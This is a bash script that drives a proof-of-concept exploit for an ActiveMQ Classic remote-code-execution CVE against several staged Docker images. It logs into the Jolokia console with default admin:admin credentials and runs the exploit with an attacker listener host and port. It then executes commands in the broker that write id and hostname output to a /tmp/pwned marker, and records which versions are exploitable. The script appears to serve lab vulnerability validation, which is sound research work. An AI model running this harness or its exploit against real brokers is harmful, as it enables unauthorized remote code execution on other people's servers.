#!/usr/bin/env bash
# CVE-2026-34197 multi-version validation matrix.
# Drives the rewritten poc.py against each staged docker image.
# Run on the lab box (192.168.1.119) where the images are local.
set -uo pipefail

POC=$(dirname "$0")/poc.py

VERSIONS=(
  "apache/activemq-classic:5.18.3"
  "apache/activemq-classic:5.18.6"
  "apache/activemq-classic:6.1.4"
  "apache/activemq-classic:6.1.7"
)

RESULTS=$(dirname "$0")/results.tsv
DOCKER0=$(ip -4 addr show docker0 | awk '/inet /{print $2}' | cut -d/ -f1)
printf 'version\tverdict\tuid\thost\tjvm\n' > "$RESULTS"

cleanup() { docker rm -f amq-test 2>/dev/null || true; }
trap cleanup EXIT

for IMG in "${VERSIONS[@]}"; do
  TAG=${IMG##*:}
  echo
  echo "================================================================"
  echo "  $IMG"
  echo "================================================================"
  cleanup
  if ! docker run -d --name amq-test -p 8161:8161 "$IMG" >/dev/null; then
    printf '%s\tdocker_run_failed\t\t\t\n' "$TAG" >> "$RESULTS"; continue
  fi

  ready=0
  for i in $(seq 1 90); do
    code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 2 \
              -u admin:admin -H 'Origin: http://127.0.0.1:8161' \
              "http://127.0.0.1:8161/api/jolokia/version" || echo 000)
    if [ "$code" = "200" ]; then ready=1; break; fi
    sleep 1
  done
  if [ "$ready" != 1 ]; then
    echo "[!] $TAG: web console did not come up"
    docker logs --tail 20 amq-test
    printf '%s\tconsole_not_ready\t\t\t\n' "$TAG" >> "$RESULTS"; continue
  fi
  echo "[+] $TAG: web console ready"

  MARKER=/tmp/pwned-$TAG
  CMD="(id; hostname; java -version 2>&1 | head -1; echo VULN-$TAG) > $MARKER 2>&1"

  python3 "$POC" \
      --target 127.0.0.1 --port 8161 \
      --lhost "$DOCKER0" --lport 8888 \
      --command "$CMD" \
      --wait 12 2>&1 | sed 's/^/    /'

  sleep 4

  if docker exec amq-test test -f "$MARKER" 2>/dev/null; then
    out=$(docker exec amq-test cat "$MARKER" 2>/dev/null)
    uid_line=$(printf '%s\n' "$out" | grep -m1 '^uid=' || true)
    host_line=$(printf '%s\n' "$out" | sed -n '2p' || true)
    jver_line=$(printf '%s\n' "$out" | sed -n '3p' || true)
    echo "[+] $TAG: RCE CONFIRMED"
    printf '%s\n' "$out" | sed 's/^/    /'
    printf '%s\texploitable\t%s\t%s\t%s\n' "$TAG" "$uid_line" "$host_line" "$jver_line" >> "$RESULTS"
  else
    echo "[!] $TAG: marker file not found"
    docker logs --tail 30 amq-test 2>&1 | tail -15 | sed 's/^/    /'
    printf '%s\tno_marker\t\t\t\n' "$TAG" >> "$RESULTS"
  fi
done

echo
echo "================================================================"
echo "  RESULTS"
echo "================================================================"
column -t -s $'\t' "$RESULTS"
